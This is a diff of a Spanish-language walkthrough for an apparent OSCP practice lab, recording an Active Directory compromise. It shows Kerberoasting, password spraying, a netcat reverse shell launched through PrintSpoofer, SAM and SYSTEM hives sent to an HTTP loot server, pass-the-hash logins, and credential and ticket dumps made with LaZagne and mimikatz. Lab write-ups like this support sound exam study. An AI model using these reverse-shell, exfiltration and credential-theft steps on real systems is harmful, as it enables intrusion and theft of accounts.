@@ -129,7 +129,7 @@ Nmap done: 1 IP address (1 host up) scanned in 220.61 seconds
 | 8443/tcp | open   | ssl/http     | Microsoft HTTPAPI httpd 2.0 - Cert CN=MS01.oscp.exam |
 
 
-2. Enumerando **MS01**
+2. Reconocimiento desde dentro
 
 ```powershell
 ┌──(root㉿kali)-[/home/kali/OffSec/Challenges/5_OSCP-B]
@@ -757,8 +757,7 @@ PS C:\Users\eric.wallows\Documents> .\Rubeus.exe kerberoast /outfile:hashes.kerb
 ```
 > Encontramos dos usuarios:
 
-1. Descargamos el archivo
-
+1. Escargamos el archivo
 ```powershell
 *Evil-WinRM* PS C:\Users\eric.wallows\Documents> download hashes.kerberoast
                                         
@@ -827,17 +826,15 @@ Stopped: Mon Aug 18 16:39:52 2025
 |web_svc | Diamond1 |
 |sql_svc | Dolphin1 |
 
-
-> Levantamos agente y tunel ligolo
-
-* Propagamos credenciales sobre el **DC01**
+* Despues de agregar las credenciales propagamos sobre el **DC01**
 
 ```bash
 ┌──(root㉿kali)-[/home/…/OffSec/Challenges/5_OSCP-B/AD-Machines]
 └─# nxc smb 10.10.165.146 -u users.txt -p passwords.txt --continue-on-success
-
+...
 SMB         10.10.165.146   445    DC01             [+] oscp.exam\web_svc:Diamond1 
 SMB         10.10.165.146   445    DC01             [+] oscp.exam\sql_svc:Dolphin1
+...
 ```
 
 * Ejecutamos nmap sobre **MS02**
@@ -994,7 +991,7 @@ SQL (OSCP\sql_svc  dbo@master)>
 * Generamos payload en [shells](https://www.revshells.com/)
 
 ```bash
-ip : 10.10.206.147 <-- Ip interna
+ip : 10.10.206.147
 port : 4444
 shell : powershell #3 (base64)
 ```
@@ -1081,7 +1078,7 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 PS C:\> dir
                                                                                                                                                                                                                   
     Directory: C:\                                                                                                                                                                                                
-\                                                                                                                                                                                                                  
+                                                                                                                                                                                                                  
 Mode                 LastWriteTime         Length Name                                                                                                                                                            
 ----                 -------------         ------ ----                                                                                                                                                            
 d-----         12/7/2019   1:14 AM                PerfLogs                                                                                                                                                        
@@ -1095,177 +1092,627 @@ d-----          4/4/2022   6:00 AM                windows.old
 
 * Obtenemos **windows.old**
 
+
+=========================
+
+** Aca me quede **
+
+=========================
+
 ```powershell
 PS C:\> net view \\10.10.206.147                                                                                                                                                                                  
-Shared resources at \\10.10.206.147                                                                                                                                           
-                                                                                                                                                                               
-Share name  Type  Used as  Comment
-                                                                                                                                                                                
-------------------------------------------------------------
-setup       Disk                                                                                                                                                      
+Shared resources at \\10.10.206.147                                                                                                                                                                               
+
+Share name  Type  Used as  Comment                                                                                                                                                                                
+                                                                                                                                                                                                                  
+-------------------------------------------------------------------------------                                                                                                                                   
+setup       Disk                                                                                                                                                                                                  
 The command completed successfully.
 ```
 
-> Explorar xcopy C:\windows.old \\10.10.206.147\setup con priviliegios administrativos elevados desde **MS02**
+* Explorar xcopy C:\windows.old \\10.10.206.147\setup con priviliegios administrativos elevados desde **MS02**
 
-* Aggregamos listener
-
-```bash
-listener_add --addr 10.10.170.147:4445 --to 192.168.45.152:4445 --tcp
-```
-
-* Ejecutamos PrintSpoofer
-
-```powershell
-PS C:\Users\Public\Documents> .\PrintSpoofer64.exe -c "C:\Users\Public\Documents\nc.exe 10.10.170.147 4445 -e cmd"
-[+] Found privilege: SeImpersonatePrivilege                                                                                                                                                                       
-[+] Named pipe listening...                                                                                                                                                                                       
-[+] CreateProcessAsUser() OK
-
-```
-
-* Receptor
+* **Resultados nmap DC01**
 
 ```bash
-┌──(root㉿kali)-[/home/kali/OffSec/Challenges]
-└─# nc -lvnp 4445
-listening on [any] 4445 ...
-connect to [192.168.45.152] from (UNKNOWN) [192.168.45.152] 33732
-Microsoft Windows [Version 10.0.19042.1586]
-(c) Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32>whoami
-whoami
-nt authority\system
-
-C:\Windows\system32>cd C:\  
-cd C:\
-
-C:\>dir
-dir
- Volume in drive C has no label.                                                                                                                                                                                  
- Volume Serial Number is 68A4-24C5                                                                                                                                                                                
-                                                                                                                                                                                                                  
- Directory of C:\                                                                                                                                                                                                 
-                                                                                                                                                                                                                  
-08/21/2025  02:40 PM             2,692 output.txt                                                                                                                                                                 
-12/07/2019  02:14 AM    <DIR>          PerfLogs                                                                                                                                                                   
-12/20/2022  02:57 AM    <DIR>          Program Files                                                                                                                                                              
-11/10/2022  03:52 AM    <DIR>          Program Files (x86)                                                                                                                                                        
-12/01/2022  04:15 AM    <DIR>          Users                                                                                                                                                                      
-12/20/2022  02:58 AM    <DIR>          Windows                                                                                                                                                                    
-04/04/2022  06:00 AM    <DIR>          windows.old
-               1 File(s)          2,692 bytes
-               6 Dir(s)  10,117,079,040 bytes free
-
-C:\>cd windows.old
-
-C:\Users\Public\Documents>xcopy C:\windows.old\Windows\System32\SAM \\10.10.170.147\setup
-xcopy C:\windows.old\Windows\System32\SAM \\10.10.170.147\setup                                                                                                                                                   
-C:\windows.old\Windows\System32\SAM                                                                                                                                                                               
-Access denied   
-
-```
-
-* Usamos un loot_server descargamos SAM y SYSTEM:
-
-```powershell
-C:\Users\Public\Documents>powershell -ep bypass
-powershell -ep bypass
-Windows PowerShell
-Copyright (C) Microsoft Corporation. All rights reserved.
-
-Try the new cross-platform PowerShell https://aka.ms/pscore6
-
-PS C:\Users\Public\Documents> .\Send-FileToLootSerer.ps1 -FilePath "C:\windows.old\Windows\System32\SAM" -URL "http://10.10.170.147:4446"
-.\Send-FileToLootSerer.ps1 -FilePath "C:\windows.old\Windows\System32\SAM" -URL "http://10.10.170.147:4446"
-
-
-StatusCode        : 200
-StatusDescription : OK
-Content           : {70, 105, 108, 101...}
-RawContent        : HTTP/1.0 200 OK
-                    Date: Fri, 22 Aug 2025 00:13:33 GMT
-                    Server: BaseHTTP/0.6 Python/3.13.5
-                    
-                    File received.
-Headers           : {[Date, Fri, 22 Aug 2025 00:13:33 GMT], [Server, BaseHTTP/0.6 Python/3.13.5]}
-RawContentLength  : 14
-
-Archivo enviado exitosamente: SAM
-
-
-PS C:\Users\Public\Documents> .\Send-FileToLootSerer.ps1 -FilePath "C:\windows.old\Windows\System32\SYSTEM" -URL "http://10.10.170.147:4446"
-.\Send-FileToLootSerer.ps1 -FilePath "C:\windows.old\Windows\System32\SYSTEM" -URL "http://10.10.170.147:4446"
-
-
-StatusCode        : 200
-StatusDescription : OK
-Content           : {70, 105, 108, 101...}
-RawContent        : HTTP/1.0 200 OK
-                    Date: Fri, 22 Aug 2025 00:14:54 GMT
-                    Server: BaseHTTP/0.6 Python/3.13.5
-                    
-                    File received.
-Headers           : {[Date, Fri, 22 Aug 2025 00:14:54 GMT], [Server, BaseHTTP/0.6 Python/3.13.5]}
-RawContentLength  : 14
-
-Archivo enviado exitosamente: SYSTEM
-
-PS C:\Users\Public\Documents> 
-```
-
-* Dumpeamos secrets:
-
-```bash
-
 ┌──(root㉿kali)-[/home/…/OffSec/Challenges/5_OSCP-B/AD-Machines]
-└─# impacket-secretsdump -sam SAM -system SYSTEM LOCAL
-Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+└─# nmap -A -sSVC 10.10.76.146 -oN 146-nmap.txt
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-17 20:16 -03
+Nmap scan report for 10.10.76.146
+Host is up (0.14s latency).
+Not shown: 988 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-17 23:17:19Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: oscp.exam0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: oscp.exam0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host                                                                                                                                                                                            
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                                                                              
 
-[*] Target system bootKey: 0x8bca2f7ad576c856d79b7111806b533d
-[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Host script results:
+| smb2-time: 
+|   date: 2025-08-17T23:17:38
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: -2s
+|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:6d:11 (VMware)
+
+TRACEROUTE
+HOP RTT       ADDRESS
+1   136.48 ms 10.10.76.146
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 100.26 seconds
+```
+
+#### Tabla de Puertos y Servicios — 10.10.76.146
+
+| Puerto   | Estado | Servicio     | Versión / Descripción                                                          |
+| -------- | ------ | ------------ | ------------------------------------------------------------------------------ |
+| 53/tcp   | open   | domain       | Simple DNS Plus                                                                |
+| 88/tcp   | open   | kerberos-sec | Microsoft Windows Kerberos (server time: 2025-08-17 23:17:19Z)                 |
+| 135/tcp  | open   | msrpc        | Microsoft Windows RPC                                                          |
+| 139/tcp  | open   | netbios-ssn  | Microsoft Windows netbios-ssn                                                  |
+| 389/tcp  | open   | ldap         | Active Directory LDAP — Domain: *oscp.exam0.*, Site: *Default-First-Site-Name* |
+| 445/tcp  | open   | microsoft-ds | SMB                                                                            |
+| 464/tcp  | open   | kpasswd5     | Kerberos password change service                                               |
+| 593/tcp  | open   | ncacn\_http  | Microsoft Windows RPC over HTTP 1.0                                            |
+| 636/tcp  | open   | tcpwrapped   | LDAPS (probablemente LDAP sobre SSL)                                           |
+| 3268/tcp | open   | ldap         | Global Catalog LDAP — Domain: *oscp.exam0.*, Site: *Default-First-Site-Name*   |
+| 3269/tcp | open   | tcpwrapped   | Global Catalog LDAPS                                                           |
+| 5985/tcp | open   | http         | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) — WinRM HTTP                           |
+
+
+#### Ejecutamos LaZagne en MS01
+
+```powershell
+PS C:\Users\eric.wallows\Documents> .\LaZagne.exe
+.\LaZagne.exe
+
+|====================================================================|
+|                                                                    |
+|                        The LaZagne Project                         |
+|                                                                    |
+|                          ! BANG BANG !                             |
+|                                                                    |
+|====================================================================|
+
+[+] System masterkey decrypted for 233ec4f0-427e-4365-81f1-eb0113562a7b
+[+] System masterkey decrypted for 9577d491-234f-4cc7-bda6-c7cb787def4f
+[+] System masterkey decrypted for 98e7f77d-8897-4d55-935d-61f8a68c56ec
+[+] System masterkey decrypted for bdba25ce-60c3-4414-bd18-0b98d962eb85
+
+########## User: SYSTEM ##########
+
+------------------- Hashdump passwords -----------------
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
-tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
-Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
-David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
-Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
-[*] Cleaning up... 
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
+Mary.Williams:1002:aad3b435b51404eeaad3b435b51404ee:9a3121977ee93af56ebd0ef4f527a35e:::
+support:1003:aad3b435b51404eeaad3b435b51404ee:d9358122015c5b159574a88b3c0d2071:::
+
+------------------- Lsa_secrets passwords -----------------
+
+$MACHINE.ACC
+0000   F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
+0010   11 D2 44 C5 7E F8 21 42 92 49 2F 48 3E 7E 03 A3    ..D.~.!B.I/H>~..
+0020   AC 1D C1 C0 52 0C C7 3C 9E 24 C0 F4 89 A5 9E 3D    ....R..<.$.....=
+0030   B0 36 28 58 54 9E 4A 63 8A 5C AE 25 45 F5 E6 84    .6(XT.Jc...%E...
+0040   D7 28 60 0B 46 CA 67 28 28 FF 72 72 3A 52 B4 3B    .(`.F.g((.rr:R.;
+0050   2F A3 4E 7B A5 13 31 A6 51 9F FA 9C 05 ED 28 A9    /.N{..1.Q.....(.
+0060   C3 7F ED CA 35 94 AE C4 0B 5D 23 C8 8F 5A D5 B7    ....5....]#..Z..
+0070   38 4D C0 FA 7A 72 FD 81 C3 2F BF 5E 7A 99 0D 2E    8M..zr.../.^z...
+0080   69 6A 5C DE F6 43 21 84 3E C5 CA D0 59 89 D5 63    ij...C!.>...Y..c
+0090   48 BC 5C DA CA 07 7B 31 79 38 FB 61 87 43 2E CD    H.....{1y8.a.C..
+00A0   53 77 43 FE BE E1 87 86 76 72 B1 84 DD F8 A8 D2    SwC.....vr......
+00B0   B6 A2 1C B1 76 18 C1 2C AB 15 BF A9 1D 9D 3C 53    ....v..,......<S
+00C0   7F 8E 76 08 B9 D5 3E 55 AC 10 18 55 ED A8 5E AC    ..v...>U...U..^.
+00D0   80 1B 95 C3 BE 6B 9B DC EA 5A 63 AC DA 64 B6 81    .....k...Zc..d..
+00E0   F9 1E CD 83 AC A6 DC 22 03 04 B4 65 55 17 C6 A4    ......."...eU...
+00F0   80 EC 9B A1 1C 46 7C 27 46 59 AE 62 31 09 DA C4    .....F|'FY.b1...
+0100   8A BF 53 56 F1 F1 21 E1 F7 1A 47 E5 58 7A 56 0A    ..SV..!...G.XzV.
+
+DefaultPassword
+0000   1E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
+0010   37 00 6B 00 38 00 58 00 48 00 6B 00 33 00 64 00    7.k.8.X.H.k.3.d.
+0020   4D 00 74 00 6D 00 70 00 6E 00 43 00 37 00 00 00    M.t.m.p.n.C.7...
+
+DPAPI_SYSTEM
+0000   01 00 00 00 14 CC 9A CC BB 06 D4 AF 8F 07 29 57    ..............)W
+0010   49 93 3B 06 CF 0D 6D FD 4C 31 EB 80 2E 35 29 D3    I.;...m.L1...5).
+0020   4F 19 8A 04 73 A6 74 5C F5 94 85 27                O...s.t....'
+
+NL$KM
+0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
+0010   F1 9F 8D 0A 3D 6B 2D 13 69 96 2E 4C 32 4D C3 66    ....=k-.i..L2M.f
+0020   D5 36 97 AB 1F 0B F2 38 11 3E DF 05 AE DF 31 70    .6.....8.>....1p
+0030   C0 E3 97 A0 08 31 A9 2A E3 88 48 DD 2C 88 86 56    .....1.*..H.,..V
+0040   83 C9 79 90 03 D5 9D 28 C1 BE 33 D6 0E 7B B7 9B    ..y....(..3..{..
+0050   76 FF 4E 76 F0 C3 6D 1D 2B 88 24 F9 96 B9 0E A1    v.Nv..m.+.$.....
+
+
+[+] 0 passwords have been found.
+For more information launch it again with the -v option
+
+elapsed time = 8.87500786781311
+PS C:\Users\eric.wallows\Documents>
 ```
 
-#### Obtenemos el flag
+**suport password**
 
-```bash
-┌──(root㉿kali)-[/home/…/OffSec/Challenges/5_OSCP-B/AD-Machines]
-└─# evil-winrm -i 10.10.170.146 -u 'tom_admin' -H 4979d69d4ca66955c075c41cf45f24dc -P 5985   
-                                        
-Evil-WinRM shell v3.7
-                                        
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
-                                        
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
-Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\tom_admin\Documents> Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
-                                                                                                                                                                                                                  
-                                                                                                                                                                                                                  
-    Directory: C:\Users\Administrator\Desktop                                                                                                                                                                     
-                                                                                                                                                                                                                  
-                                                                                                                                                                                                                  
-Mode                LastWriteTime         Length Name                                                                                                                                                             
-----                -------------         ------ ----                                                                                                                                                             
--a----        8/21/2025   2:40 PM             34 proof.txt                                                                                                                                                        
-                                                                                                                                                                                                                  
 
-*Evil-WinRM* PS C:\Users\tom_admin\Documents> type C:\Users\Administrator\Desktop\proof.txt
-fd3531af56ec27349df6ea52ad7ebd83
-*Evil-WinRM* PS C:\Users\tom_admin\Documents> 
+|User| Hash | Plaintext |
+|----|------|-----------| 
+|support | d9358122015c5b159574a88b3c0d2071 | Freedom1 |
+
+
+**Derault password**
+
+```
+DefaultPassword
+0000   1E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
+0010   37 00 6B 00 38 00 58 00 48 00 6B 00 33 00 64 00    7.k.8.X.H.k.3.d.
+0020   4D 00 74 00 6D 00 70 00 6E 00 43 00 37 00 00 00    M.t.m.p.n.C.7...
 ```
 
-==================================================================
+**Analizar con** [https://www.boxentriq.com/code-breaking/hex-analysis](boxentri)
+
+```
+1E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
+37 00 6B 00 38 00 58 00 48 00 6B 00 33 00 64 00   
+4D 00 74 00 6D 00 70 00 6E 00 43 00 37 00 00 00
+```
+
+**resultado: 7k8XHk3dMtmpnC7**
+
+
+> Revizamos desde **MS01** la comunicacion con **DC01**
+
+```powershell
+PS C:\Users\eric.wallows\Documents> Test-NetConnection 10.10.76.146 -Port 445
+Test-NetConnection 10.10.76.146 -Port 445
+
+
+ComputerName     : 10.10.76.146
+RemoteAddress    : 10.10.76.146
+RemotePort       : 445
+InterfaceAlias   : Ethernet1
+SourceAddress    : 10.10.76.147
+TcpTestSucceeded : True
+```
+* Revisamos la red:
+
+```powershell
+PS C:\Users\eric.wallows\Documents> ipconfig  
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 192.168.116.147
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.116.254
+
+Ethernet adapter Ethernet1:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 10.10.76.147
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . :
+```
+
+```powershell
+PS C:\Users\eric.wallows\Documents> Get-NetComputer -Unconstrained
+Get-NetComputer -Unconstrained
+
+
+pwdlastset                    : 8/17/2025 2:09:05 PM
+logoncount                    : 68
+msds-generationid             : {120, 248, 89, 18...}
+serverreferencebl             : CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=oscp,DC=exam
+badpasswordtime               : 12/31/1600 4:00:00 PM
+useraccountcontrol            : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
+distinguishedname             : CN=DC01,OU=Domain Controllers,DC=oscp,DC=exam
+objectclass                   : {top, person, organizationalPerson, user...}
+lastlogontimestamp            : 8/17/2025 2:09:05 PM
+name                          : DC01
+objectsid                     : S-1-5-21-2610934713-1581164095-2706428072-1000
+samaccountname                : DC01$
+localpolicyflags              : 0
+codepage                      : 0
+samaccounttype                : MACHINE_ACCOUNT
+accountexpires                : NEVER
+cn                            : DC01
+whenchanged                   : 8/17/2025 9:09:05 PM
+instancetype                  : 4
+msdfsr-computerreferencebl    : CN=DC01,CN=Topology,CN=Domain System 
+                                Volume,CN=DFSR-GlobalSettings,CN=System,DC=oscp,DC=exam
+objectguid                    : 5d3b61fe-4808-429d-8c24-cfa3355a36d3
+operatingsystem               : Windows Server 2019 Standard
+operatingsystemversion        : 10.0 (17763)
+lastlogoff                    : 12/31/1600 4:00:00 PM
+objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=oscp,DC=exam
+dscorepropagationdata         : {3/25/2022 2:43:59 PM, 1/1/1601 12:00:01 AM}
+serviceprincipalname          : {ldap/DC01/OSCP, HOST/DC01.oscp.exam/OSCP, ldap/DC01.oscp.exam/OSCP, HOST/DC01/OSCP...}
+usncreated                    : 12293
+lastlogon                     : 8/17/2025 2:09:11 PM
+badpwdcount                   : 0
+msds-supportedencryptiontypes : 28
+whencreated                   : 3/25/2022 2:43:58 PM
+countrycode                   : 0
+primarygroupid                : 516
+iscriticalsystemobject        : True
+usnchanged                    : 102556
+ridsetreferences              : CN=RID Set,CN=DC01,OU=Domain Controllers,DC=oscp,DC=exam
+dnshostname                   : DC01.oscp.exam
+
+```
+
+* Obtenemos un **TGS** de **web_svc**
+
+```powershell
+PS C:\Users\eric.wallows\Documents> .\mimikatz.exe                                                                                                                                                                
+.\mimikatz.exe                                                                                                                                                                                                    
+                                                                                                                                                                                                                  
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08                                                                                                                                                      
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                                                                                                                                                                       
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )                                                                                                                                          
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz                                                                                                                                                           
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )                                                                                                                                         
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/                                                                                                                                         
+                                                                                                                                                                                                                  
+mimikatz # privilege::debug                                                                                                                                                                                       
+Privilege '20' OK                                                                                                                                                                                                 
+                                                                                                                                                                                                                  
+mimikatz # sekurlsa::tickets                                                                                                                                                                                      
+                                                                                                                                                                                                                  
+Authentication Id : 0 ; 1888638 (00000000:001cd17e)                                                                                                                                                               
+Session           : Batch from 0                                                                                                                                                                                  
+User Name         : web_svc                                                                                                                                                                                       
+Domain            : OSCP                                                                                                                                                                                          
+Logon Server      : DC01                                                                                                                                                                                          
+Logon Time        : 8/17/2025 2:58:18 PM                                                                                                                                                                          
+SID               : S-1-5-21-2610934713-1581164095-2706428072-2606                                                                                                                                                
+                                                                                                                                                                                                                  
+         * Username : web_svc
+         * Domain   : OSCP.EXAM
+         * Password : (null)
+
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+         [00000000]
+           Start/End/MaxRenew: 8/17/2025 2:58:18 PM ; 8/18/2025 12:58:18 AM ; 8/24/2025 2:58:18 PM
+           Service Name (02) : krbtgt ; OSCP.EXAM ; @ OSCP.EXAM
+           Target Name  (02) : krbtgt ; OSCP ; @ OSCP.EXAM
+           Client Name  (01) : web_svc ; @ OSCP.EXAM ( OSCP )
+           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 
+           Session Key       : 0x00000001 - des_cbc_crc      
+             3387a883f5b0b2046bcfcc3adbac8d807eab158330489eda9902ceaadbda4ce6
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
+
+Authentication Id : 0 ; 1832750 (00000000:001bf72e)
+Session           : Network from 0
+User Name         : eric.wallows
+Domain            : OSCP
+Logon Server      : DC01
+Logon Time        : 8/17/2025 2:49:58 PM
+SID               : S-1-5-21-2610934713-1581164095-2706428072-7102
+
+         * Username : eric.wallows
+         * Domain   : oscp.exam
+         * Password : (null)
+
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+         [00000000]
+           Start/End/MaxRenew: 8/17/2025 2:49:58 PM ; 8/17/2025 3:04:58 PM ; 8/24/2025 2:09:31 PM
+           Service Name (01) : ms01$ ; @ (null)
+           Target Name  (10) : eric.wallows ; @ (null)
+           Client Name  (10) : eric.wallows ; @ oscp.exam
+           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
+           Session Key       : 0x00000001 - des_cbc_crc      
+             979ca87b07c82198cb2dfd0f6c64e3e3fdaec0827cc9a12b2bb4da0605962af7
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
+
+        Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 563946 (00000000:00089aea)
+Session           : Batch from 0
+User Name         : Administrator
+Domain            : MS01
+Logon Server      : MS01
+Logon Time        : 2/12/2025 2:59:59 PM
+SID               : S-1-5-21-2114389728-3978811169-1968162427-500
+
+         * Username : Administrator
+         * Domain   : MS01
+         * Password : (null)
+
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 2/12/2025 2:57:47 PM
+SID               : S-1-5-19
+
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 77315 (00000000:00012e03)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2/12/2025 2:57:47 PM
+SID               : S-1-5-90-0-1
+
+         * Username : MS01$
+         * Domain   : oscp.exam
+         * Password : a8 8f 03 0f 1b 9a 75 c7 94 10 5d 36 e7 56 34 3b 89 6c 35 68 50 94 53 7c 4a 60 db ec eb fa 56 ed 2f 36 88 b0 b2 2f 10 8e 11 b6 be 10 7f d4 f2 b5 39 cd 0b b4 dc 4e e5 57 c0 ae 17 cc 7b ab 73 19 39 45 4e a9 8c c6 de 67 84 ce 45 09 bb e3 3c 3c 4f af 8c ff c9 40 a1 96 6a b8 e2 8d c0 69 12 e7 e7 87 ce 1a 5b 38 b2 f0 11 40 fa 4e 34 8e 1d 33 6e d3 c4 5e 91 c7 83 df be dd 45 30 a7 3f f5 29 b2 51 02 25 c4 67 79 c9 5d 7b 90 c9 3a c7 fd 89 1e 23 05 8e 31 cc 4e 9f 7d 8e cb 10 e0 1b 81 58 50 df 29 26 d4 73 4b 93 cf 9d a7 55 7d 53 57 a9 c9 08 96 93 2d 65 82 88 04 d5 14 fe ac 0e d7 a3 9c c2 0e 63 a6 ed a3 bb 83 97 f7 a3 08 68 0d 4c b7 77 77 0a 3e 85 26 15 ff 92 b8 8a 00 26 c2 b4 f2 d5 25 bd 8e d4 f7 74 39 2e 78 27 e7 26 20 0e 
+
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 77288 (00000000:00012de8)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2/12/2025 2:57:47 PM
+SID               : S-1-5-90-0-1
+
+         * Username : MS01$
+         * Domain   : oscp.exam
+         * Password : 29 08 7e 13 f9 5b 95 e1 5a ea 66 93 e4 ff f7 92 63 34 cf e5 6a 27 5e 4b cc 37 0a 2b 53 41 df f7 86 82 4d c9 cb 76 29 d9 d2 6c 76 38 68 f6 7e 50 c1 df 02 d8 36 be 90 4a a0 53 cf 27 f4 a1 e1 0e 1d a4 bc 17 fc 3d 15 ff db 99 17 d4 58 cf 49 fc 42 29 1e 37 3c 1c fc 77 3e fe c1 68 0a da 8f 0d dd ae c6 f8 d5 f7 6c 65 8f 44 3a 2d d9 53 a0 e8 b3 1c bc 69 2d 0e eb 92 18 b7 e0 17 b7 e2 ea 72 94 72 b0 4c 4c c1 2c 06 bb b0 71 e8 f1 d9 56 d7 b1 66 0b a3 3c f1 25 37 4c 01 f6 27 5a c9 be 73 b7 a9 8f 68 5b a4 9d e7 eb e7 6f 33 cd 23 ac 5f d8 20 e4 af d3 e5 28 2d 5c 92 3d c4 1c b4 d7 f1 d6 05 c2 7e 0b 4b a5 4b f0 00 4e 05 ed bf c7 a3 b1 24 92 49 4d a6 6c f6 fd a1 68 1f e6 6f 80 9a f2 71 d8 c5 fc 30 f1 57 61 20 ac 38 02 31 c5 1f 
+
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : MS01$
+Domain            : OSCP
+Logon Server      : (null)
+Logon Time        : 2/12/2025 2:57:47 PM
+SID               : S-1-5-20
+
+         * Username : ms01$
+         * Domain   : OSCP.EXAM
